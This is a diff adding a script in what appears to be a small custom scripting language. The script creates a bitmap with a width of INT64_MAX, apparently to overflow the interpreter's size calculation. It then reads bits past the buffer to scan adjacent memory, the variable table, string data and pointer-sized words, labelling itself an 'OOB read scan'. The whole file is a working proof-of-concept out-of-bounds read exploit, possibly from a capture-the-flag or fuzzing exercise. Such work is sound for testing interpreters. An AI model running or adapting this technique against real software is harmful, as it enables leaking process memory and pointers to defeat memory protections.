@@ -1,0 +1,87 @@
+bitmap b1 = create(9223372036854775807, 2);
+
+print("=== Scanning buffer (y=0) ===");
+int i = 0;
+int bit = 0;
+while (i < 128) {
+    bit = get(b1, i, 0);
+    if (bit != 0) {
+        print(i);
+        print(bit);
+    }
+    i = i + 1;
+}
+
+print("=== Scanning adjacent memory ===");
+i = 128;
+while (i < 512) {
+    bit = get(b1, i, 0);
+    if (bit != 0) {
+        print(i);
+        print(bit);
+    }
+    i = i + 8;
+}
+
+print("=== Attempting to read variable table ===");
+i = 0;
+while (i < 1024) {
+    bit = get(b1, i, 0);
+    if (bit != 0) {
+        print(i);
+        print(bit);
+    }
+    i = i + 64;
+}
+
+print("=== Reading full bytes ===");
+i = 0;
+int hasdata = 0;
+int offset = 0;
+while (i < 256) {
+    hasdata = 0;
+    offset = 0;
+    while (offset < 8) {
+        bit = get(b1, i * 8 + offset, 0);
+        if (bit != 0) {
+            hasdata = 1;
+            print(i);
+            print(offset);
+            print(bit);
+        }
+        offset = offset + 1;
+    }
+    i = i + 1;
+}
+
+print("=== Attempting to find string data ===");
+i = 0;
+while (i < 1024) {
+    bit = get(b1, i, 0);
+    if (bit != 0) {
+        print(i);
+        print(bit);
+    }
+    i = i + 1;
+}
+
+print("=== Reading potential pointers (QWORDs) ===");
+i = 0;
+int j = 0;
+while (i < 128) {
+    hasdata = 0;
+    j = 0;
+    while (j < 64) {
+        bit = get(b1, i * 64 + j, 0);
+        if (bit != 0) {
+            hasdata = 1;
+        }
+        j = j + 1;
+    }
+    if (hasdata != 0) {
+        print(i);
+    }
+    i = i + 1;
+}
+
+print("=== Comprehensive OOB read scan completed ===");
